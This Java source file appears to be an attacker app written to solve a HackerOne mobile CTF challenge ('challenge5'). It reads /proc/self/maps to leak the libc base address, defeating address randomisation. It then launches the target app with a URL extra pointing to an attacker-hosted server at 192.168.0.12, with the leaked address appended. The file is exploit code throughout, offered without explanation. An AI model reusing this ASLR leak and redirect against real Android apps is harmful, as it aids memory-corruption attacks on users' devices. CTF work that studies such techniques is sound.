package com.hackerone.mobile.chall5hack;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import java.io.FileReader;
import android.util.Log;
import android.content.Intent;

import java.io.BufferedReader;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent appStart = getPackageManager().getLaunchIntentForPackage("com.hackerone.mobile.challenge5");

        appStart.putExtra("url","http://192.168.0.12/#"+getLibcBase());

        startActivity(appStart);

    }

    private String getLibcBase(){
        try (BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"))) {
            String ln;
            while ((ln = br.readLine()) != null) {
                if(ln.contains("libc.so") && ln.contains("r-xp")){
                    return ln.split("-")[0];
                }
            }
        }catch(Exception e){
            Log.d("ReadErr", "AAAAAAAAAAAAAAAAAAAAAA");
            return null;
        }
        return null;
    }
}
